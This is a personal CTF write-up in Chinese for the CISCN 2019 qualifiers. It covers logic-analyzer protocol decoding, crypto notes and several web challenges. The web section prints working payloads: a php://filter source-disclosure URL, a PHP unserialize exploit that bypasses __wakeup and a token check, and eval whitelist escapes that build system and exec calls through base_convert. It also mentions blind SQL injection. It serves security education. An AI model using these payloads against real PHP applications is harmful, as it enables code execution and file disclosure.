---
title: CISCN 2019 Quals Writeup(补档)
categories: CTF
tags:
  - writeup
abbrlink: 41838
date: 2019-06-03 20:42:16
---

比赛过去已经比较久了,拖延症一直懒得写wp.

去年也参加过ciscn,基本上只解了个签到题就进了线下(丢人)

今年稍微好一点,但是参数队伍明显多了,还好线下赛也扩容了.

确确实实,真真切切的意识到自己和大佬们的差距,不仅仅是比赛经验带来了,还有思维方式以及学习能力的差距.

## MISC

### 0x00 签到题

打开软件自己就给flag了.

 三个圆圈也行?

flag{87e37d95-6a48-4463-aff8-b0dbd27d3b7d}

### 0x01 saleae

拿到附件,看到`.logicdata`后缀,随便google一下

![1](1.png)

找到一个叫saleae工具,这不就是题目名称么...

完全没接触过数电方面的东西.下载安装好用saleae打开`.logicdata`文件

![2](2.png)

搜了一下saleae的基本操作,导出csv格式的文件.

![3](3.png)

第一列01交替,第三列0和1随机,写了个脚本取将第三列的数据直接转ascii.

不太对,但是得到`flag{`这个字符串了,后面是乱码.

继续翻google,看各种文档.大概知道了这个叫串行同步传输协议.

<https://www.jianshu.com/p/b0c5810a79ef>

8位bit一组,当电位改变时传输一位bit.

稍微改下脚本,得到:

`01100110011011000110000101100111011110110011000100110010001
10000001101110011000100110011001110010011011100101101001100
01001110010110010000110001001011010011010000111000011001010
01001110010110010000110001001011010011010000111000011001010011011000101101011000100110010100111000011000110010110100110110110001011010110001001100101001110000110001100101101001101110011100000110100011100111000001101000110001000111000001110010110000100111000110001000111000001110010110000100111001001101010110010100110000001101110111110100110101011001010011000000110111011111011`

转ascii码

![4](4.png)

`flag{12071397-19d1-48e6-be8c-784b89a95e07}`

### 0x02 24c

第二天的比赛还有进阶的题目.

对数电一无所知,直接把题目复制到google,就看到L2C关键字,又看到saleae里面见过.

所以用saleae打开附件,选择L2C协议解析.

![5](5.png)

一眼就看到flag(对flag总是特别敏感)

导出为csv.把flag拼接一下

![6](6.png)

(完整的截图找不到了..)

` f163bdf4e}flag{c46d9e10-e9b5-4d90-a883-41c\ac`

明显不对,google翻L2C协议

<https://zhuanlan.zhihu.com/p/31086959>

大致意思就是读flag的一个过程,中间有几次write操作.

write操作传输的第一个Byte表示写入位置.

改好flag即可.

`flag{c46dac10-e9b5-4d90-a883-41cf163bdf4e}`

### 0x03 usbasp

文件格式还一样的.google也没搜到有用的结果.反正saleae里面就这么几个协议,一个一个事.

很快就试到有意义的字符串.

翻到最后找到flag

`flag{85b084c6-42e6-495c-87b4-46dfb1df58a0}`

## CRYPTO

### 0x04 justsoso

各种计算器+现实找人+百度解的.

`flag{01924dd7-1e14-48d0-9d80fa6bed9c7a00}0`

### 0x05 warmup

总感觉这种题做过好几次了,和去年的DDCTF里的一题基本一样.

可以控制填充字符串的长度,直接一位一位爆破出来.

(脚本稍后附上)

## WEB

### 0x06 JustSoso

伪协议读源码,根据Hint先读`hint.php`的

`/?file=php://filter/read=convert.base64-encode/resource=hint.php`

```php
<?php
    class Handle{
    private $handle;
    public function __wakeup(){
        foreach(get_object_vars($this) as $k => $v) {
            $this->$k = null;
        }
        echo "Waking up\n";
    }
    public function __construct($handle) {
        $this->handle = $handle;
    }
    public function __destruct(){
        $this->handle->getFlag();
    }
}

class Flag{
    public $file;
    public $token;
    public $token_flag;

    function __construct($file){
        $this->file = $file;
        $this->token_flag = $this->token = md5(rand(1,10000));
    }

    public function getFlag(){
        $this->token_flag = md5(rand(1,10000));
        if($this->token === $this->token_flag)
        {
            if(isset($this->file)){
                echo @highlight_file($this->file,true);
            }
        }
    }
}
?>
```

顺便读一下`index.php`的

```php
<html>
    <?php
    error_reporting(0);
$file = $_GET["file"];
$payload = $_GET["payload"];
if(!isset($file)){
    echo 'Missing parameter'.'<br>';
}
if(preg_match("/flag/",$file)){
    die('hack attacked!!!');
}
@include($file);
if(isset($payload)){
    $url = parse_url($_SERVER['REQUEST_URI']);
    parse_str($url['query'],$query);
    foreach($query as $value){
        if (preg_match("/flag/",$value)) {
            die('stop hacking!');
            exit();
        }
    }
    $payload = unserialize($payload);
}else{
    echo "Missing parameters";
}
?>
    <!--Please test index.php?file=xxx.php -->
    <!--Please get the source of hint.php-->
    </html>
```

很明显的PHP反序列化的题目,审源码尝试构造反序列化字符串.

逻辑比较清晰,构造一个反序列化字符串,使得在`__destruct`时调用`Flag`类中`getflag`函数,期间要绕过各种判断.

那么一个一个找办法绕.

1. 第一个就是`__weakup`时会把变量置为`null`,以`php 反序列化 __weakup`为关键字搜索,很快就找到不少文章.

   php反序列化绕过 __weakup](https://mochazz.github.io/2018/12/30/PHP反序列化bug/)

> 这个 **bug** 的原理是：当反序列化字符串中，表示属性个数的值大于真实属性个数时，会跳过 **__wakeup** 函数的执行。

2. `$handle`是私有变量,以`php 反序列化 私有变量`为关键字搜索.

    [PHP序列化和反序列化基础](https://mntn0x.github.io/2018/03/12/PHP序列化和反序列化漏洞基础/)

> 在DemoPoc 中，**mntn data** 占了10个长度，是因为序列化时：对象私有化成员会自动添加了类名，以区分他们是Private 变量；如果是Protected 变量则会添加* 号。并且前缀添加空字节

3. `flag`关键字不能出现, 以`php parse_url 漏洞`为关键字搜索

   [谈谈parse_url](http://pupiles.com/谈谈parse_url.html)

加几个斜杠,成功绕过.

4. 绕过md5比较.这里有两种方法,一种是直接碰撞,另外一种就是`引用`,使token变为token_flag的引用.

   最终payload:

`///index.php?file=hint.php&payload=O:6:"Handle":2:{s:14:"%00Handl
e%00handle";O:4:"Flag":3:{s:4:"file";s:8:"flag.php";s:5:"token";s:32:"c4ca
4238a0b923820dcc509a6f75849b";s:10:"token_flag";R:4;}}`

`flag{570a8aea-e399-4e02-be6f-9496a70d6cb7}`

### 0x07 全宇宙最简单的SQL

确实很简单,但是比赛的时候没做出来,深深的认识到了自己的不足.

看到wp的时候,环境已经关了,也没有截图了.

先拿常用的sql关键字的字典爆破一下,看看哪些东西被过滤了.

顺便手测了一下,基本确定是个盲注.当最终拼接语句无错误时无论结果如何均为 `登录失败`.
当最终语句有错时返回为 `数据库操作失败`.

在网上看到两种解法.

1. 时间盲注.

   直接贴大佬的链接了[ROIS](<https://xz.aliyun.com/t/4906#toc-7>)和[Zedd](https://blog.zeddyu.info/2019/05/06/2019ciscn/#全宇宙最简单的SQL),两位大佬用的方式稍微有不同

2. 布尔盲注

   还是贴链接吧,[ctfwp.com](https://www.ctfwp.com/articals/2019national.html#全宇宙最简单的sql)

   [Mochazz](https://mochazz.github.io/2019/04/22/第12届全国大学生信息安全竞赛Web题解/),这位大佬用的方法和我差不多,但是我在中间出了点小问题,卡住了.通过`and`短路来使`pow(9999,100)`报错

接下来就是mysql蜜罐读文件了,刚前两天的DDCTF2019就出来过,又来了,但是我根本就没做到这里(捂脸)

<https://github.com/allyshka/Rogue-MySql-Server>

github上有个工具.

### 0x08 love_math

这题我也没做出来,也是卡在中间某一步,痛苦~

右键源代码可以看到一个可用函数的白名单,基本都是`math`库里的.

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

<https://www.php.net/manual/zh/ref.math.php>

目标就是构造一个80字符以下的payload读到flag

```
# system('ls')
base_convert(1751504350,10,36)(base_convert(784,10,36))

# phpinfo()
base_convert(55490343972,10,36)()
```

问题来了,只能转换出字母和数字,特殊符号没办法.(我就卡在这里)

实际上绕道而行,通过其他params引入即可.比如url后面跟个变量,还有ROIS大佬的`system(getallheaders(){9})`,通过header引入.

最最最优雅的解法来自我在群内看到的某个群友,忘记名字了,只保存了payload:

`base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260465194)))`

79个字符,`exec(hex2bin(6e6c20662a))`

`6e6c20662a`内容是`nl f*`

太秀了,允许我膜一下!!!

最后一题web没看懂,了解了大致思路,想复现环境没了.找机会再补上